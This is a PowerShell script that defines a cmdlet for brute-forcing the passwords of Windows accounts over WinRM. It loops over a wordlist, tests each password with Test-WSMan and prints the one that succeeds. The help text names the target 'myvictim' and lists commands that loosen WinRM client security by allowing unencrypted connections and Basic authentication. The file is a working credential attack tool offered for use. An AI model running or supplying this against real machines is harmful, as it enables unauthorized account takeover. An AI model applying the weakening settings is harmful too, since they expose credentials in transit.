Function Get-WinRMPassword {
<#
.SYNOPSIS
Simple bruteforce attack upon a Windows machine running WinRM

.DESCRIPTION
This CMDLet will perform a simplistic bruteforce attack upon a Windows Server or Client running WinRM in either a domain joined or workgroup configuration. 
The CMDLet will try each UserName + Password Combination until a sucessfuly entry is found or the list is exhausted. If nothing is output, then 

.PARAMETER UserName
The username you wish to gain entry with

.PARAMETER ComputerName
Target machine

.PARAMETER wordlist
String path to file containing list of words/passwords

.PARAMETER Authentication
WinRM auth mechanism, defaults to Negotiate (should work on most systems). See the specifics of the Authentication parameter in test-wsman.

.PARAMETER UseSSL
Specifies that the Secure Sockets Layer (SSL) protocol should be used to establish a connection to the remote
computer. By default, SSL is not used.

.EXAMPLE
get-winrmpassword -UserName Administrator -ComputerName myvictim -WordList c:\mywordlist.txt
Will read mywordlist.txt and for each entry in that list, try Administrator:<entry> 

.NOTES
If you are not in a domain joined (running workgroup), then you should do the following:
1. Add the "target" to the WinRM trusted hosts - winrm set winrm/config/client @{TrustedHosts="victim"}
2. You may need to enable "unencrypted" (http connections) - winrm set winrm/config/client @{AllowUnencrypted="true"}
3. You may need to enable basic auth - winrm set winrm/config/client/auth @{Basic="true"}

.INPUTS 
None
This cmdlet does not accept any input.

.OUTPUTS 
None
This cmdlet does not generate any output object

.LINK
http://aperturescience.su/

#>

[CMDLetBinding()]
param (
  [Parameter(mandatory=$true)] [String] $username,
  [Parameter(mandatory=$true)] [String] $ComputerName,
  [Parameter(mandatory=$true)] [String] $wordlist,
  [String] $Authentication = "Negotiate",
  [switch] $UseSSL
)

#read word list (consider pipeline for performance)
$wordlistentries = Get-Content $wordlist

foreach ($entry in $wordlistentries) {
	Write-Verbose "Trying $entry"
	
	#make a secure string, and then a pscredentials object with username and password
	$securepassword = ConvertTo-SecureString $entry -AsPlainText -Force
	$pscredentials = New-Object System.Management.Automation.PSCredential ($username, $securepassword)
	
	#clear error listing
	$Error.clear()
	
	#run the test, taking into account the SSL status
	if ($UseSSL) {
		Test-WSMan -ComputerName $ComputerName -Credential $pscredentials -Authentication $Authentication -erroraction SilentlyContinue -UseSSL | Out-Null
	} else {
		Test-WSMan -ComputerName $ComputerName -Credential $pscredentials -Authentication $Authentication -erroraction SilentlyContinue | Out-Null
	}
	
	#put the first error into a variable (best practice)
	$ourerror = $error[0]
	
	# if there is no error, then we were successfull, else, was it a username or password error? if it wasn't username/password incorrect, something else is wrong so break the look
	if ($ourerror -eq $null) {
		"Password Found: $entry"
		break
	} elseif (-not $ourerror.ErrorDetails.Message.Contains("The user name or password is incorrect.")) {
		"Check the settings, confirm host is in TrustedHosts, confirm hostname, check for SSL etc, $($ourerror.ErrorDetails.Message)"
		break 
	} else {
		Write-Debug "$($ourerror.ErrorDetails.Message)"
	}
}
	
}